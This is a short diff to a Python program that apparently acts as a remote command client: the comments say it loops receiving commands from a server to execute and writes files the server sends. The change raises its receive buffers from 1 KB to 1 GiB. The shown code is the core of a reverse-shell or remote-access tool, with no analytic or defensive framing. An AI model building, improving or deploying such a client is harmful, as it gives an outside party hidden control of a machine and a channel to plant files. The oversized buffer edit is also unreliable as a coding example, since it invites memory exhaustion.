@@ -24,7 +24,7 @@ def main(host, port):
     # Loop to receive and execute commands from the server
     while True:
         # Receive command from server
-        receive = patil.recv(1024).decode()
+        receive = patil.recv(1024*1024*1024).decode()
         # Check for exit command to break the loop
         if receive == "exit":
             break
@@ -44,7 +44,7 @@ def main(host, port):
             with open(filename, "wb") as f:
                 while True:
                     # Receive file data from the server
-                    file_data = patil.recv(1024)
+                    file_data = patil.recv(1024*1024*1024)
                     # Check for DONE marker to end file writing
                     if file_data.endswith(b"DONE"):
                         f.write(file_data[:-4])
